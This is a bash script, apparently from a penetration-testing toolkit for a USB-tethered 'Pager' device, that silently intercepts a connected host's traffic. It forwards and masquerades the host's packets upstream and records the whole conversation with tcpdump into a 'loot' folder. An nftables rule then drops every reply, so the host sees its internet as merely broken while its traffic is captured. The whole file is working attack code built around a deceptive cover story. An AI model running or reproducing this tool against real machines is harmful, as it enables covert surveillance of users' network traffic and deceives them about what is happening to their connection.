#!/bin/bash
# stealthnet.sh - stealth intercept / "hanging internet" (approved idea U3).
#
# THE IDEA: a host is tethered to the Pager over USB-C (eth0/br-lan). Make the
# host look like its internet is broken - every request just hangs - while the
# Pager SILENTLY forwards that traffic upstream, receives the real responses
# (and captures them), then WITHHOLDS them from the host. Full silent
# interception behind a plausible "the network's down" cover story.
#
# Mechanism (nftables + conntrack):
#   - IP forwarding + masquerade out the uplink, so the host's packets really
#     do reach the internet and the replies really do come back to the Pager.
#   - tcpdump on the uplink records the whole conversation to loot.
#   - a forward rule DROPS the reply leg heading back toward the host
#     (oifname host-iface, ct state established/related -> drop). The host's
#     SYNs leave, the SYN-ACKs return to the Pager and are logged, but never
#     reach the host - so from the host's side every connection just hangs.
#
# Usage:
#   stealthnet.sh --on  [--host-iface br-lan] [--uplink IFACE]
#   stealthnet.sh --off
#   stealthnet.sh --status
#
# --host-iface  where the intercepted host sits (default br-lan = USB-C side).
# --uplink      the Pager's own internet-facing iface (auto-detect if omitted).
#
# WARNING: if the tethered host is also your SSH box, its connectivity is what
# you're breaking - run this from the on-screen Controller, not over that link.
# Authorized hosts only.

set -u
TOOL_NAME="stealthnet.sh"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/lib/common.sh"

RUN="/tmp/pager-stealthnet"
CAP="/root/loot/stealthnet"
NFT_TABLE="pager_stealth"
CAPPID="$RUN/tcpdump.pid"

usage() { sed -n '2,28p' "$0" | sed 's/^# \{0,1\}//'; exit 1; }

MODE=""; HOST_IFACE="br-lan"; UPLINK=""
filter_yes_args "$@"; set -- "${FILTERED_ARGS[@]}"
while [ $# -gt 0 ]; do
    case "$1" in
        --on) MODE="on"; shift ;;
        --off) MODE="off"; shift ;;
        --status) MODE="status"; shift ;;
        --host-iface) HOST_IFACE="${2:-br-lan}"; shift 2 ;;
        --uplink) UPLINK="${2:-}"; shift 2 ;;
        -h|--help) usage ;;
        --) shift ;;
        *) die "Unknown argument: $1 (see --help)" ;;
    esac
done
[ -n "$MODE" ] || usage

# auto_uplink - the interface carrying the default route (our real internet).
auto_uplink() {
    timeout "${IP_LINK_TIMEOUT:-5}" ip route show default 2>/dev/null | awk '/^default/ {for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1); exit}}'
}

do_on() {
    command -v nft >/dev/null 2>&1 || die "nft (nftables) not found."
    [ -n "$UPLINK" ] || UPLINK=$(auto_uplink)
    [ -n "$UPLINK" ] || die "No uplink found - give one with --uplink (the Pager's own internet iface)."
    [ "$UPLINK" = "$HOST_IFACE" ] && die "Uplink and host-iface can't be the same ($UPLINK)."
    mkdir -p "$RUN" "$CAP"
    echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null

    nft add table inet "$NFT_TABLE" 2>/dev/null
    # NAT so replies come back to us
    nft add chain inet "$NFT_TABLE" nat '{ type nat hook postrouting priority 100; }' 2>/dev/null
    nft add rule  inet "$NFT_TABLE" nat oifname "$UPLINK" masquerade 2>/dev/null
    # forward: let the host OUT, but silently drop everything coming BACK to it
    nft add chain inet "$NFT_TABLE" fwd '{ type filter hook forward priority 0; }' 2>/dev/null
    nft add rule  inet "$NFT_TABLE" fwd iifname "$HOST_IFACE" oifname "$UPLINK" accept 2>/dev/null
    nft add rule  inet "$NFT_TABLE" fwd oifname "$HOST_IFACE" ct state established,related drop 2>/dev/null

    # capture the real conversation on the uplink
    local stamp; stamp=$(date +%Y%m%d-%H%M%S)
    if command -v tcpdump >/dev/null 2>&1; then
        ( tcpdump -i "$UPLINK" -n -w "$CAP/stealth-$stamp.pcap" >/dev/null 2>&1 ) &
        echo $! > "$CAPPID"
    fi
    say "Stealth intercept UP: $HOST_IFACE traffic forwarded out $UPLINK and captured; replies withheld."
    say "The host now sees hanging/broken internet. Capture: $CAP/stealth-$stamp.pcap"
}

do_off() {
    [ -f "$CAPPID" ] && { kill "$(cat "$CAPPID" 2>/dev/null)" 2>/dev/null; rm -f "$CAPPID"; }
    command -v nft >/dev/null 2>&1 && nft delete table inet "$NFT_TABLE" 2>/dev/null
    say "Stealth intercept OFF - the host's internet works normally again."
}

do_status() {
    if command -v nft >/dev/null 2>&1 && nft list table inet "$NFT_TABLE" >/dev/null 2>&1; then
        say "Stealth intercept ACTIVE (nft table $NFT_TABLE present)."
        [ -f "$CAPPID" ] && kill -0 "$(cat "$CAPPID" 2>/dev/null)" 2>/dev/null && say "  capturing (tcpdump PID $(cat "$CAPPID"))."
    else
        say "Not active."
    fi
}

case "$MODE" in
    on) do_on ;;
    off) do_off ;;
    status) do_status ;;
esac
